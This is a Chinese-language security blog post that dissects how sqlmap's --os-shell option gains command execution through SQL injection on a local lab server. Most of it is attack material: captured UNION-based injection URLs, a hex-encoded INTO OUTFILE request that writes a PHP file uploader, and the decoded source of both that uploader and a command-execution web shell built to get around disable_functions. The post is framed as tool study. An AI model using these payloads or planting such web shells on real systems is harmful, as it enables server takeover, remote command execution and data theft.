---
title: SQLMAP --os-shell 学习
date: 2018-03-26 18:13:23
tags:
		- SQLi
categories:
		- 安全研究
---

`SQLMAP --os-shell` 学习

<!-- more -->



####  SQLMAP --os-shell


`--os-shell`命令

>--os-shell Prompt for an interactive operating system shell
>It is also possible to simulate a real shell where you can type as many arbitrary
commands as you wish. The option is --os-shell and has the same TAB
completion and history functionalities that --sql-shell has.
Where stacked queries has not been identified on the web application (e.g. PHP
or ASP with back-end database management system being MySQL) and the
DBMS is MySQL, it is still possible to abuse the SELECT clause’s INTO OUTFILE
to create a web backdoor in a writable folder within the web server document
root and still get command execution assuming the back-end DBMS and the
web server are hosted on the same server. sqlmap supports this technique and
allows the user to provide a comma-separated list of possible document root
sub-folders where try to upload the web file stager and the subsequent web
backdoor. Also, sqlmap has its own tested web file stagers and backdoors for
the following languages:

`--os-shell`可以上传一个后门执行系统命令。比如`MYSQL`使用`select  into outfile`来完成上传一个文件。

##### 抓包

成功运用`--os-shell`命令需要几个条件。

1. MySQL root 权限
2. 知道网站的物理路径，且Mysql具有写入文件权限



这篇分析的是<font color=red>[SQL注入写shell不成功后](http://www.sec-note.com/2018/01/11/SQLi_shell/)</font>，对其中的高权限，但是没有文件写入权限的情况下利用。

	sqlmap -u "192.168.86.194:8000/waf/test.php?id=1" --os-shell

接下来选择执行的脚本，和路径的选择。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/29338404.jpg)

两个文件

	http://192.168.86.194:8000/waf/tmpupqwj.php     上传后门
	http://192.168.86.194:8000/waf/tmpbyiqd.php     执行系统命令后门


抓包看上传内容。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/78328674.jpg)

注入进去的内容

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/56328920.jpg)

URL解码

好像这几个`payload`影响不大，没有进行写文件。 

	http://127.0.0.1:8000/waf/test.php?id=1&gOxn=9680 AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1-- ../../../etc/passwd 

	http://127.0.0.1:8000/waf/test.php?id=-4698 UNION ALL SELECT CONCAT(0x7178767a71,(CASE WHEN (0x57=UPPER(MID(@@version_compile_os,1,1))) THEN 1 ELSE 0 END),0x716b787871),NULL,NULL-- -


	http://127.0.0.1:8000/waf/test.php?id=-9962 UNION ALL SELECT CONCAT(0x7178767a71,IFNULL(CAST(LENGTH(LOAD_FILE(0x2f70687053747564792f7777772f746d70756a6367762e706870)) AS CHAR),0x20),0x716b787871),NULL,NULL-- -

__tmpupqwj.php 上传文件__



URL解码

使用 `into outfile` 写入在`/phpStudy/www/waf/tmpupqwj.php`文件里面。


	http://127.0.0.1:8000/waf/test.php?id=-6603 OR 3720=3720 LIMIT 0,1 INTO OUTFILE '/phpStudy/www/waf/tmpupqwj.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c70687053747564795c5c7777775c5c7761665c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -- -



[LINES TERMINATED BY](https://dev.mysql.com/doc/refman/5.7/en/load-data.html)则是into outfile的参数，意思是行结尾的时候用by后面的内容，通常的一般为‘/r/n’，此处我们将by后的内容修改为后面的16进制的文件。

在`Mysql`终端使用`select '编码内容'`

	| <?php
	if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.
	1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILE
	S["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name
	"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@ch
	mod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERV
	ER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name
	=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file
	type=file><br>to directory: <input type=text name=uploadDir value=\\phpStudy\\ww
	w\\waf\\> <input type=submit name=upload value=upload></form>";}?>
	 |

整理一下。

	1	php	Php is a good lanagule
	<?php
	if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];
	if (phpversion()<'4.1.0'){
	    $file=$HTTP_POST_FILES["file"]["name"];
	    @move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();
	    }
	    else
	    {$file=$_FILES["file"]["name"];
	    @move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();
	    }
	    @chmod($dir."/".$file,0755);
	    echo "File uploaded";
	    }
	    else 
	    {
	    echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=\\phpStudy\\www\\waf\\> <input type=submit name=upload value=upload></form>";
	    }
	    ?>

访问：可以利用这个文件进行上传大马或者其他文件。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/999775.jpg)

__tmpbyiqd.php 执行命令__

	<?php 
	$c=$_REQUEST["cmd"];
	@set_time_limit(0);
	@ignore_user_abort(1);
	@ini_set('max_execution_time',0);
	$z=@ini_get('disable_functions');
	if(!empty($z))
	{
	    $z=preg_replace('/[, ]+/',',',$z);
	    $z=explode(',',$z);
	    $z=array_map('trim',$z);
	    }
	else{
	    $z=array();
	    }
	    
	$c=$c." 2>&1\n";
	function f($n){
	    global $z;
	    return is_callable($n)and!in_array($n,$z);
	        }
	    if(f('system'))
	        {
	        ob_start();system($c);$w=ob_get_contents();
	        ob_end_clean();
	        }
	    elseif(f('proc_open')){
	        $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);
	        $w=NULL;
	        while(!feof($t[1])){
	        $w.=fread($t[1],512);
	            }
	        @proc_close($y);
	            }
	    elseif(f('shell_exec'))
	        {$w=shell_exec($c);
	            }
	    elseif(f('passthru')){
	        ob_start();
	        passthru($c);
	        $w=ob_get_contents();
	        ob_end_clean();
	            }
	    elseif(f('popen')){
	        $x=popen($c,r);
	        $w=NULL;
	        if(is_resource($x)){
	            while(!feof($x)){
	                $w.=fread($x,512);
	                   }
	                    }
	                @pclose($x);
	                }
	    elseif(f('exec')){
	        $w=array();
	        exec($c,$w);
	        $w=join(chr(10),$w).chr(10);
	            }
	        else{$w=0;}
	        print "<pre>".$w."</pre>";
	 ?>
	                                    
                                    
![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/53746434.jpg)

`--os-shell`主要还是用`into outfile`将代码使用十六进制字符进行上传到服务器上，然后执行对应的操作。

                                    
                                    
                                    
                                    
                                                                                      
                      

#### 参考

[sqlmap os shell解析](http://www.cnblogs.com/lcamry/p/5505110.html)

[【Sqlmap】os-shell详解](http://vinc.top/2014/06/22/sqlmap-mssql-os-shell%E8%AF%A6%E8%A7%A3/)
